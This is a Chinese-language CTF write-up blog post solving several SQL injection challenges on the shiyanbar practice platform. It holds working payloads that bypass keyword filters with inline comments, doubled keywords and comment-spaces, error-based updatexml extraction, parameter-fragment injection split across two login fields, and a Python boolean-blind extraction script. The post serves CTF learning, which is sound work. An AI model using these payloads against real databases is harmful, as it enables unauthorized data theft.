---
title: 实验吧 web writeup
date: 2018-04-18 19:03:31
tags:
---
本篇博客连续更新实验吧的web篇解题思路。
<!--more -->


# 简单的SQL注入

在ID框 输入1，有返回信息。

	ID: 1
	name: baloteli

输入 `'`，报错。

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

然后输入所有关键字信息，看到底过滤了什么。

```
1 and or union select from where = information_schema table_name table_schema column_name order by information_schema.tables --+ /**/ // # %00
```

得到信息：

	ID: 1 or   = information_schema table_name information_schema.tables    /**/ //

看来屏蔽了不少关键字。

对于过滤，可以考虑 `内联注释`、`双重关键字` 、 `大小写混用` 、 `编码` 。

`大小写混用` 不好使。


这里尝试注入 `1' or '1'='1`，得到正常信息，怀疑sql语句为：
```
select * from xx where id='xxx'
```

## 采用 `报错注入` + `内联注释` 方式。

### 内联注释

采用 `/*! code */` 来执行我们的SQL语句。


比如一个过滤器过滤了：
```
union,where, table_name, table_schema, =, and information_schema
```

这些都是我们内联注释需要绕过的目标。所以通常利用内联注释进行如下方式绕过：
```
id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
```

这里我们需要的语句是
```
1' or updatexml(1,concat('~',(select database() LIMIT 0,1),'~'),3) or '1'='1  
```

```
1' or updatexml(1,concat('~',(/*!select*/ database() LIMIT 0,1),'~'),3) or '1'='1  
```

得到反馈信息：

	XPATH syntax error: '~web1~'


查表名字：

```
1'or updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

```
1'or updatexml(1,concat('~',(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schema*/='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

这里报错了！

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '='web1' limit 0,1),'~'),3) or '1'='1'' at line 1

明明在前面的验证中， `table_schema` 是被过滤的呀，添加了内联注释也不行？

在尝试了`1 /*!table_schema*/` 之后发现，果然被过滤掉了。

那采取 `双重关键字` 。 `table_schema` 换成 `table_schtable_schemaema`

输入 `1 table_schtable_schemaema` 得到 `>ID: 1  table_schema`。很好。

```
1'or updatexml(1,concat('~',(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schtable_schemaema*/='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

拿到表格

	XPATH syntax error: '~flag~'

之后继续拿字段。
```
1'or updatexml(1,concat('~',(/*!select*/  column_name /*!from*/ information_schema.columns /*!where*/ table_name='flag' LIMIT 0,1),'~'),3) or '1'='1  
```

输入后，发现 `column_name` 、 `information_schema.columns` 都被过滤了，好奇怪。拿只好用 `双重关键字` 方法了。
```
1'or updatexml(1,concat('~',(/*!select*/  colucolumn_namemn_name  /*!from*/ infinformation_schema.columnsormation_schema.columns /*!where*/ table_name='flag' LIMIT 0,1),'~'),3) or '1'='1  
```

	XPATH syntax error: '~flag~'
得到表的字段：`flag`, `id`

直接获取 `flag`:

```
1'or updatexml(1,concat('~',(/*!select*/  flag  /*!from*/ flag LIMIT 0,1),'~'),3) or '1'='1
```

	XPATH syntax error: '~flag{Y0u_@r3_5O_dAmn_90Od}~'


## `双重关键字`

# 简单的SQL注入2

搞了半天就屏蔽了空格符号。那么把空格符替换掉就可以了。

```
1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'%3d'1
```

	ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: baloteli</pre><pre>ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: flag{Y0u_@r3_5O_dAmn_90Od}


# 加了料的报错注入

根据提示，本题修改HTTP数据传输方式为`POST`，传输数据为 `username=1&password=1` 。

提示
> Login failed
> <!-- $sql="select * from users where username='$username' and password='$password'";  -->

绕过password：
```
username=1'&password=or'1
```
构造的SQL语句为 

> select * from users where username='1'`' and password='`or'1'

得到的显示结果为
> You are our member, welcome to enter

没有给出回显字段，可以通过基于错误回显的SQL注入。

先分别查看 `username` 和 `password` 过滤的字符串

`username`：
```
--+ # = - mid like union order limit substr rand ascii sleep ( ) 
```

`password`： 
```
--+ # = - mid like union order limit substr rand ascii sleep extractvalue updatexml
```

## HTTP分割注入（HTTP Parameter Fragment）

基于错误回显的注入为
`updatexml(1,concat(0x7e,version(),0x7e),1)`，但是这条语句不能通过单一的参数传，两个参数过滤的关键字不同，
可以采用HTTP分割注入：`username` 未过滤 `updatexml` ，而 `password` 未过滤 `()`， 中间的语句通过注释符过滤掉。

```
username=1' or updatexml/*&password=*/(1,concat(0x7e, (version()),0x7e),1) or '
```
得到回显错误：
> XPATH syntax error: '~5.5.47~'

那么接下来就是顺利成章的爆出数据库、表、字段和数据。

```
username=1' or updatexml/*&password=*/(1,concat(0x7e,database(),0x7e),1) or '
```
> XPATH syntax error: '~error_based_hpf~'
password过滤了 `=` 和 `like`，那么可以采用 `regexp` 或者 不等号`<>` 来查询。
```
username=1' or updatexml/*&password=*/(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema regexp database(),0x7e),1) or '

```
上面的用例报错，由于没有在 `select group_concat(table_name) from information_schema.tables where table_schema regexp database()` 外面加括号导致，很费解，加上就好了。
```
username=1' or updatexml/*&password=*/(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or '
# 或者
username=1' or updatexml/*&password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema<>database())),0x7e),1) or '
```
> XPATH syntax error: '~ffll44jj,users~'

```
username=1' or updatexml/*&password=*/(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'),0x7e),1) or '
```
> XPATH syntax error: '~value~'

```
username=1' or updatexml/*&password=*/(1,concat(0x7e, (select group_concat(value) from ffll44jj),0x7e),1) or '
```
> XPATH syntax error: '~flag{err0r_b4sed_sqli_+_hpf}~'


[加了料的报错注入(实验吧)](https://www.cnblogs.com/s1ye/p/8284806.html)

# 简单的SQL注入3


字符型注入

布尔型盲注

```
1' and (select count(*) from flag)>0--+
1' and (select ascii(substr(flag,1,1)) from flag limit 0,1)>97--+
```


```
import requests
import string

url="http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (select length(flag) from flag limit 0,1)={0}--+"
url2="http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (select ascii(substr(flag,{0},1)) from flag limit 0,1)={1}--+"
'''
i=0
while True:
        i+=1
        res=requests.get(url.format(i))
        if res.content.find("Hello!")!= -1:
                print "Found it, i=",i
                break
        print "Not found, i=",i

Found it, i= 26
'''
printable=string.printable
print "printable is ",printable
result=""
for i in range(26):
        print "Now i=",i+1
        for c in (printable):
                res=requests.get(url2.format(i+1, ord(c)))
                if res.content.find("Hello!")!= -1:
                        print "Found it, i=",i+1, "char is ", c
                        result+=c
                        break
print "result is " , result

```


# 参考
- [西普实验吧CTF解题Writeup大全](http://hebin.me/2017/09/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E8%A7%A3%E9%A2%98writeup%E5%A4%A7%E5%85%A8/)
